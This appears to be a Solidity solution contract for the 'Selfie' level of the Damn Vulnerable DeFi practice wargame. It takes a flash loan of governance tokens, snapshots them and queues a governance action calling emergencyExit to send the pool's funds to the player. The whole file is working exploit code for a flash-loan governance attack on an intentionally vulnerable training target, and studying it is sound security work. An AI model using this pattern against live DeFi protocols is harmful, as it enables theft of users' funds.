// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import {SelfiePool} from "./SelfiePool.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import {DamnValuableTokenSnapshot} from "../DamnValuableTokenSnapshot.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

import "hardhat/console.sol";

contract SelfieHack is IERC3156FlashBorrower {
    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableTokenSnapshot token;
    address player;

    uint256 public actionId;

    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(address _pool, address _governance, address _token, address _player) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = DamnValuableTokenSnapshot(_token);
        player = _player;
    }

    function pwn() external {
        pool.flashLoan(this, address(token), pool.maxFlashLoan(address(token)), "0x");
    }

    function onFlashLoan(address initiator, address _token, uint256 amount, uint256, bytes memory)
        external
        override
        returns (bytes32)
    {
        require(msg.sender == address(pool), "SelfieHack: not from pool");
        require(initiator == address(this), "SelfieHack: not from self");

        DamnValuableTokenSnapshot t = DamnValuableTokenSnapshot(_token);
        t.snapshot();
        t.approve(address(pool), amount);
        actionId = governance.queueAction(address(pool), 0, abi.encodeWithSelector(pool.emergencyExit.selector, player));

        return CALLBACK_SUCCESS;
    }
}
